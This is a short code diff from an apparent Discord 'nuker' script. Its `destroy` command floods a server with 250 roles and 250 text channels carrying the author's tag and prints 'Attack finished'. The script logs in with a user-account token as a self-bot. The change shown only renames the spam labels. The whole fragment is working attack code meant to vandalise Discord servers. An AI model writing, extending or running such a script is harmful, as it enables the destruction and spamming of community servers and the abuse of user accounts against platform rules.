@@ -177,8 +177,8 @@ async def destroy(ctx):
         except:
             pass
     for _i in range(250):
-        await ctx.guild.create_role(name=f"Nuked-by-squishy#9876")
+        await ctx.guild.create_role(name=f"nuker-made-by-squishy#9876")
     for _i in range(250):
-        await ctx.guild.create_text_channel(name=f"Nuked-by-squishy#9876")
+        await ctx.guild.create_text_channel(name=f"nuker-made-by-squishy#9876")
     print("Attack finished")
 client.run(token, bot=False)
